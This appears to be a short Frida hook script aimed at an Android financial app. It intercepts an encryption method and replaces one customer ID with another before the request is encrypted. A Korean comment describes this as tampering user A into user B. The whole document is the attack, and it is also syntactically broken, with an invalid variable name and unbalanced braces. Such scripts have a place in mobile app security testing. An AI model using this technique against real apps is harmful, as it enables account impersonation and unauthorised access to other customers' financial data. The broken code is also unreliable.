setImmediate(function(){
	Java.perform(function(){
		var request decryption = Java.use("com.financial.company.Example");
		request decryption.ExampleEncEx.implementation = function(a,b,c,d,e){
			console.log("[*] personal information");
					
		if(c.indexOf('7000000000')>=0){ //Cust ID Example
				console.log("[*] personal information modulation");
				c=c.replace('7000000000','5000000000'); // 사용자 A > 사용자 B 변조
				c=c.replace('7000000000','5000000000');
				c=c.replace('7000000000','5000000000');
				          
			console.log(c);
			return this.ExampleEncEx(a,b,c,d,e);
		}
	})
})